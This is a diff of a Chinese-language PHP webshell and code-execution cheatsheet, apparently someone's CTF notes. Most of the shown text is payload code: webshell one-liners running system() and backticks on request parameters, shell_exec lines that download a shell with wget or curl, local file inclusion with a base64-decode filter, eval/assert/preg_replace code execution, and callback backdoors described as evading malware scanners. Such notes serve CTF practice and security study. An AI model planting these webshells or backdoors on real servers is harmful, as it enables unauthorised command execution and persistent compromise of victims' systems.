@@ -39,39 +39,53 @@ cat${IFS}flag
    
 # Webshell cheatsheet
 ```php
+// 回顯
 <?php system('ls'); ?>
 <?php system(ls); ?>
 <?php system($_GET['cmd']); ?>
 <?php system($_GET[1]); ?>
 
-<?=`$_GET[1]`;                   // <?= is used to shorten the <?php echo `blah`;
-// ``就像exec不會直接顯示結果，需要echo
-echo `$_GET[1]`;&1=ls
+<?php passthru('ls'); ?>
 
-// local file inclusion
-include$_GET[1];             // 中間空格可以省略
 
-// 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
-$_GET[1](file,chracter,8);&1=file_put_contents .....
-include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
-
+// 不回顯
 <?php shell_exec('echo 1>1');        // 1=echo 1>1
 <?php shell_exec('>1');            // 1=>1
 
 <?php shell_exec('wget -O 1.php url');    // download shell
 <?php shell_exec('curl -o 1.php url');    // 預設下載index.html
 
+<?=`$_GET[1]`;                   // <?= is used to shorten the <?php echo `blah`;
+// ``就像exec不會直接顯示結果，需要echo
+echo `$_GET[1]`;&1=ls
+
+
+// 文件包含漏洞
+include$_GET[1];             // 中間空格可以省略
+
+// 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
+$_GET[1](file,chracter,8);&1=file_put_contents .....
+include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
+
+
+// PHP代碼執行
+<?php eval('echo `ls`;');       // eval裡的PHP代碼必須加;
+<?php assert('phpinfo();');    // assert裡的PHP代碼可以不加;
+<?php preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);  // ？str=[phpinfo()]
+
+
 // 思路：延伸數組＋回調函數 php 5.4以後的特性
 // 回調後門 多可以避免木馬查殺  
 // 參考下方reference
-?1[]=blah&1[]=system();&2=assert
+?1[]=blah&1[]=system();&2=assert     
 param=usort(...$_GET);
 ```
 長度限制思路：  
 * 用檔名拼湊成命令,再一次ls進一個shell script [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
 
 [system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
-**基本上除了system都不會直接show在頁面上，exec()和shell_exec()我們都會搭個echo**  
+**exec()和shell_exec()我們都會搭個echo**  
+[這是一篇很屌的php lib exp分析](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
 
 # Bypass blacklist extension
 文件解析漏洞  
@@ -122,4 +136,6 @@ register_tick_function ($e, $_REQUEST['pass']);
 * [PHP MANUAL Assert](http://php.net/manual/en/function.assert.php)  
 * [PHP MANUAL Usort](http://php.net/manual/en/function.usort.php)  
 * [PHP MANUAL 延長數組](http://php.net/manual/zh/migration56.new-features.php)
-* [P師傅木馬免殺](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)
+* [P師傅木馬免殺](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)  
+* [stackoverflow Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
+* [Ali0thNotes PHP代码审计归纳](https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md)
